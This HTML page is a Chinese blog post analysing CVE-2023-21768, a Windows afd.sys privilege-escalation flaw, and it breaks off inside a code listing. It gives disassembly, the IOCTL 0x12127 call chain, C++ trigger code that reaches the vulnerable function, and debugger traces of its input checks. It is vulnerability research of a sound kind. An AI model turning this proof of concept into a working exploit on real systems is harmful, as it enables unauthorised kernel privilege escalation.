<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="CVE-2023-21768漏洞分析与利用1.漏洞分析windows提权漏洞,漏洞位在afd.sys AfdNotifyRemoveIoCompletion函数中.">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2023-21768漏洞分析与利用">
<meta property="og:url" content="http://example.com/2023/07/28/CVE-2023-21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/index.html">
<meta property="og:site_name" content="Ash blog">
<meta property="og:description" content="CVE-2023-21768漏洞分析与利用1.漏洞分析windows提权漏洞,漏洞位在afd.sys AfdNotifyRemoveIoCompletion函数中.">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2023/07/28/CVE-2023-21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230728191001428.png">
<meta property="og:image" content="http://example.com/2023/07/28/CVE-2023-21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230728191051512.png">
<meta property="og:image" content="http://example.com/2023/07/28/CVE-2023-21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230728191255767.png">
<meta property="og:image" content="http://example.com/2023/07/28/CVE-2023-21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230729024035070.png">
<meta property="og:image" content="http://example.com/2023/07/28/CVE-2023-21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230729130721571.png">
<meta property="og:image" content="http://example.com/2023/07/28/CVE-2023-21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230729135429134.png">
<meta property="og:image" content="http://example.com/2023/07/28/CVE-2023-21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230729135508192.png">
<meta property="og:image" content="http://example.com/2023/07/28/CVE-2023-21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230730011214690.png">
<meta property="og:image" content="http://example.com/2023/07/28/CVE-2023-21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230730011540465.png">
<meta property="article:published_time" content="2023-07-28T10:52:55.512Z">
<meta property="article:modified_time" content="2023-07-29T17:21:54.469Z">
<meta property="article:author" content="Ash">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2023/07/28/CVE-2023-21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230728191001428.png">

<link rel="canonical" href="http://example.com/2023/07/28/CVE-2023-21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>CVE-2023-21768漏洞分析与利用 | Ash blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Ash blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/28/CVE-2023-21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Ash">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Ash blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          CVE-2023-21768漏洞分析与利用
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-07-28 18:52:55" itemprop="dateCreated datePublished" datetime="2023-07-28T18:52:55+08:00">2023-07-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-07-30 01:21:54" itemprop="dateModified" datetime="2023-07-30T01:21:54+08:00">2023-07-30</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="CVE-2023-21768漏洞分析与利用"><a href="#CVE-2023-21768漏洞分析与利用" class="headerlink" title="CVE-2023-21768漏洞分析与利用"></a>CVE-2023-21768漏洞分析与利用</h1><h2 id="1-漏洞分析"><a href="#1-漏洞分析" class="headerlink" title="1.漏洞分析"></a>1.漏洞分析</h2><p>windows提权漏洞,漏洞位在afd.sys AfdNotifyRemoveIoCompletion函数中.</p>
<p>afd.sys是windows操作系统的一个驱动程序,是winsock的一部分,用于提供网络通信的支持.</p>
<p>使用ida加载符号,直接定位到这个漏洞函数AfdNotifyRemoveIoCompletion中.x一下,看下这个函数的调用链.这个函数在AfdNotifySock中经过一系列验证后被调用.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">PAGE:00000001C006FEAE                               loc_1C006FEAE:                          ; CODE XREF: AfdNotifySock+23B↑j</span><br><span class="line">PAGE:00000001C006FEAE 48 8D 0C 5B                   lea     rcx, [rbx+rbx*2]</span><br><span class="line">PAGE:00000001C006FEB2 48 8B 46 08                   mov     rax, [rsi+8]</span><br><span class="line">PAGE:00000001C006FEB6 44 89 44 C8 14                mov     [rax+rcx*8+14h], r8d</span><br><span class="line">PAGE:00000001C006FEBB 48 8B 15 AE F9 FE FF          mov     rdx, cs:MmUserProbeAddress</span><br><span class="line">PAGE:00000001C006FEBB</span><br><span class="line">PAGE:00000001C006FEC2</span><br><span class="line">PAGE:00000001C006FEC2                               loc_1C006FEC2:                          ; CODE XREF: AfdNotifySock+273↑j</span><br><span class="line">PAGE:00000001C006FEC2 41 FF C7                      inc     r15d</span><br><span class="line">PAGE:00000001C006FEC5 E9 AA FE FF FF                jmp     loc_1C006FD74</span><br><span class="line">PAGE:00000001C006FEC5</span><br><span class="line">PAGE:00000001C006FECA                               ; ---------------------------------------------------------------------------</span><br><span class="line">PAGE:00000001C006FECA</span><br><span class="line">PAGE:00000001C006FECA                               loc_1C006FECA:                          ; CODE XREF: AfdNotifySock+148↑j</span><br><span class="line">PAGE:00000001C006FECA 4C 8B C6                      mov     r8, rsi</span><br><span class="line">PAGE:00000001C006FECD 49 8B D6                      mov     rdx, r14</span><br><span class="line">PAGE:00000001C006FED0 41 8A CC                      mov     cl, r12b</span><br><span class="line">PAGE:00000001C006FED3 E8 54 FA FF FF                call    AfdNotifyRemoveIoCompletion</span><br><span class="line">PAGE:00000001C006FED3</span><br><span class="line">PAGE:00000001C006FED8 8B D8                         mov     ebx, eax</span><br></pre></td></tr></table></figure>

<p>AfdNotifySock位于AfdImmediateCallDispatch表中的最后.</p>
<p><img src="/2023/07/28/CVE-2023-21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230728191001428.png" alt="image-20230728191001428"></p>
<p>在AfdFastIoDeviceControl中,通过control code,调用AfdImmediateCallDispatch中的函数,这里最后一个索引处的值是0x12127.也就是说当iocode为0x12127时,会调用到函数AfdNotifySock.</p>
<p>调用链如下</p>
<p>(DriverObject-&gt;FastIoDispatch)-&gt;AfdFastIoDeviceControl 0x12127-&gt;AfdNotifySock-&gt;AfdNotifyRemoveIoCompletion</p>
<p><img src="/2023/07/28/CVE-2023-21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230728191051512.png" alt="image-20230728191051512"></p>
<p><img src="/2023/07/28/CVE-2023-21768%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20230728191255767.png" alt="image-20230728191255767"></p>
<p>下面编写一个测试代码.调用AfdNotifySock函数</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ioringapi.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* FUN_NtCreateFile)</span><span class="params">(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* FUN_NtDeviceIoControlFile)</span><span class="params">(HANDLE FileHandle, HANDLE Event, VOID* ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, ULONG IoControlCode, PVOID InputBuffer, ULONG InputBufferLength, PVOID OutputBuffer, ULONG OutputBufferLength)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* FUN_NtCreateIoCompletion)</span><span class="params">(PHANDLE IoCompletionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, ULONG NumberOfConcurrentThreads)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* FUN_NtSetIoCompletion)</span><span class="params">(HANDLE IoCompletionHandle, ULONG CompletionKey, PIO_STATUS_BLOCK IoStatusBlock, NTSTATUS CompletionStatus, ULONG NumberOfBytesTransferred)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* FUN_NtQuerySystemInformation)</span><span class="params">(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AFL_NOTIFYSOCK_IOCTL 0x12127</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HMODULE ntBase = <span class="built_in">GetModuleHandleW</span>(<span class="string">L&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	FUN_NtCreateFile NtCreateFile = (FUN_NtCreateFile)<span class="built_in">GetProcAddress</span>(ntBase, <span class="string">&quot;NtCreateFile&quot;</span>);</span><br><span class="line">	FUN_NtDeviceIoControlFile  NtDeviceIoControlFile = (FUN_NtDeviceIoControlFile)<span class="built_in">GetProcAddress</span>(ntBase, <span class="string">&quot;NtDeviceIoControlFile&quot;</span>);</span><br><span class="line">	UNICODE_STRING objFilePath = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	OBJECT_ATTRIBUTES objectAttributes = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	IO_STATUS_BLOCK ioStatusBlock = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	HANDLE hSocket = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	objFilePath.Buffer = (PWSTR)<span class="string">L&quot;\\Device\\Afd\\Endpoin&quot;</span>;</span><br><span class="line">	objFilePath.Length = <span class="built_in">wcslen</span>(objFilePath.Buffer) * <span class="built_in">sizeof</span>(WCHAR);</span><br><span class="line">	objFilePath.MaximumLength = objFilePath.Length;</span><br><span class="line"></span><br><span class="line">	objectAttributes.Length = <span class="built_in">sizeof</span>(OBJECT_ATTRIBUTES);</span><br><span class="line">	objectAttributes.ObjectName = &amp;objFilePath;</span><br><span class="line">	objectAttributes.Attributes = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line">	BYTE bExtendedAttributes[] =</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0F</span>, <span class="number">0x1E</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x66</span>, <span class="number">0x64</span>, <span class="number">0x4F</span>, <span class="number">0x70</span>, <span class="number">0x65</span>, <span class="number">0x6E</span>, <span class="number">0x50</span>,</span><br><span class="line">		<span class="number">0x61</span>, <span class="number">0x63</span>, <span class="number">0x6B</span>, <span class="number">0x65</span>, <span class="number">0x74</span>, <span class="number">0x58</span>, <span class="number">0x58</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">		<span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">		<span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x60</span>, <span class="number">0xEF</span>, <span class="number">0x3D</span>, <span class="number">0x47</span>, <span class="number">0xFE</span></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	NTSTATUS status = <span class="built_in">NtCreateFile</span>(&amp;hSocket, MAXIMUM_ALLOWED, &amp;objectAttributes, &amp;ioStatusBlock, <span class="literal">NULL</span>, <span class="number">0</span>, FILE_SHARE_READ | FILE_SHARE_WRITE, <span class="number">1</span>, <span class="number">0</span>, bExtendedAttributes, <span class="built_in">sizeof</span>(bExtendedAttributes));</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[-]NtCreateFile fail:%x\n&quot;</span>, status);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	HANDLE hEvent = <span class="built_in">CreateEvent</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hEvent == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[-]CreateEvent fail:%x\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> dataLen = <span class="number">0x10</span>;</span><br><span class="line">	<span class="type">char</span>* data = (<span class="type">char</span>*)<span class="built_in">malloc</span>(dataLen);</span><br><span class="line">	<span class="built_in">memset</span>(data, <span class="number">0x41</span>, dataLen);</span><br><span class="line">	<span class="built_in">NtDeviceIoControlFile</span>(hSocket, hEvent, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;ioStatusBlock, <span class="number">0x12127</span>, data, dataLen, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>开始使用windbg调试,成功加载符号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">4: kd&gt; lm m a*</span><br><span class="line">Browse full module list</span><br><span class="line">start             end                 module name</span><br><span class="line">fffff800`62b80000 fffff800`62ba7000   acpiex     (deferred)             </span><br><span class="line">fffff800`62c30000 fffff800`62ce8000   ACPI       (deferred)             </span><br><span class="line">fffff800`631e0000 fffff800`631ed000   atapi      (deferred)             </span><br><span class="line">fffff800`631f0000 fffff800`6322d000   ataport    (deferred)             </span><br><span class="line">fffff800`67200000 fffff800`672a8000   afd        (pdb symbols)          e:\symbols\afd.pdb\8B67DF69C5D3BE18663EDAF70A48AEB51\afd.pdb</span><br><span class="line">fffff800`67340000 fffff800`67354000   afunix     (deferred)             </span><br><span class="line">fffff800`67600000 fffff800`6765b000   ahcache    (deferred)   </span><br></pre></td></tr></table></figure>

<p>使用windbg对下断点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bp afd!AfdNotifySock</span><br></pre></td></tr></table></figure>

<p>运行到此处,就跳转到后面然后返回了,没有调用到漏洞函数AfdNotifyRemoveIoCompletion,这里是因为数据长度不为0x30.所以直接跳转返回0x0C0000004了,AfdNotifySock有些前置条件判断,才会执行AfdNotifyRemoveIoCompletion.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">fffff800`6726fc30 488bc4           mov     rax, rsp</span><br><span class="line">fffff800`6726fc33 48895810         mov     qword ptr [rax+10h], rbx</span><br><span class="line">fffff800`6726fc37 48897018         mov     qword ptr [rax+18h], rsi</span><br><span class="line">fffff800`6726fc3b 48894808         mov     qword ptr [rax+8], rcx</span><br><span class="line">fffff800`6726fc3f 57               push    rdi</span><br><span class="line">fffff800`6726fc40 4154             push    r12</span><br><span class="line">fffff800`6726fc42 4155             push    r13</span><br><span class="line">fffff800`6726fc44 4156             push    r14</span><br><span class="line">fffff800`6726fc46 4157             push    r15</span><br><span class="line">fffff800`6726fc48 4881eca0000000   sub     rsp, 0A0h</span><br><span class="line">fffff800`6726fc4f 498bf1           mov     rsi, r9</span><br><span class="line">fffff800`6726fc52 458ae0           mov     r12b, r8b</span><br><span class="line">fffff800`6726fc55 0f57c0           xorps   xmm0, xmm0</span><br><span class="line">fffff800`6726fc58 0f114098         movups  xmmword ptr [rax-68h], xmm0</span><br><span class="line">fffff800`6726fc5c 0f1140a8         movups  xmmword ptr [rax-58h], xmm0</span><br><span class="line">fffff800`6726fc60 0f1140b8         movups  xmmword ptr [rax-48h], xmm0</span><br><span class="line">fffff800`6726fc64 33ff             xor     edi, edi</span><br><span class="line">fffff800`6726fc66 448bf7           mov     r14d, edi</span><br><span class="line">fffff800`6726fc69 33c0             xor     eax, eax</span><br><span class="line">fffff800`6726fc6b 0f11442438       movups  xmmword ptr [rsp+38h], xmm0</span><br><span class="line">fffff800`6726fc70 4889442448       mov     qword ptr [rsp+48h], rax</span><br><span class="line">fffff800`6726fc75 83bc24f000000030 cmp     dword ptr [rsp+0F0h], 30h</span><br><span class="line">fffff800`6726fc7d 740a             je      afd!AfdNotifySock+0x59 (fffff8006726fc89)</span><br><span class="line">fffff800`6726fc7f bb040000c0       mov     ebx, 0C0000004h</span><br><span class="line">fffff800`6726fc84 e951020000       jmp     afd!AfdNotifySock+0x2aa (fffff8006726feda)</span><br></pre></td></tr></table></figure>

<p>第4个参数是数据,第5个参数是数据长度.第6个参数是outbuf,第7个是outbuglen,当前传入数据为长度为0x41,长度为0x10.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">AfdNotifySock</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        __int64 a1,</span></span></span><br><span class="line"><span class="params"><span class="function">        __int64 a2,</span></span></span><br><span class="line"><span class="params"><span class="function">        KPROCESSOR_MODE a3,</span></span></span><br><span class="line"><span class="params"><span class="function">        __int128 *userdata,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">int</span> userdatalen,</span></span></span><br><span class="line"><span class="params"><span class="function">        __int64 outbuf,</span></span></span><br><span class="line"><span class="params"><span class="function">        <span class="type">int</span> outbuglen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">2: kd&gt; dd r9</span><br><span class="line">000001ce`8db6d320  41414141 41414141 41414141 41414141</span><br><span class="line">000001ce`8db6d330  0057005c 006e0069 4c459150 80000677</span><br><span class="line">000001ce`8db6d340  00000000 00000000 5c01005d 0e00462d</span><br><span class="line">000001ce`8db6d350  3d3a3a3d 005c3a3a 4c479156 80000753</span><br><span class="line">000001ce`8db6d360  464f5250 3d454c49 505c3a43 72676f72</span><br><span class="line">000001ce`8db6d370  61446d61 41006174 4c419154 80000854</span><br><span class="line">000001ce`8db6d380  73555c3a 5c737265 6c687361 7070415c</span><br><span class="line">000001ce`8db6d390  61746144 616f525c 4c43915a 80000900</span><br><span class="line">2: kd&gt; dd rsp+20+a0+10+18+8</span><br><span class="line">fffff587`bf33a470  00000010 ffffb209 00000000 00000000</span><br></pre></td></tr></table></figure>

<p>首先会对数据长度与合法性做一些验证,</p>
<p>首先userbuf数据长度应为0x30.</p>
<p>然后判断userbuf偏移为0x10,0x18,0x20,0x24,0x28处数据是否为空.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span 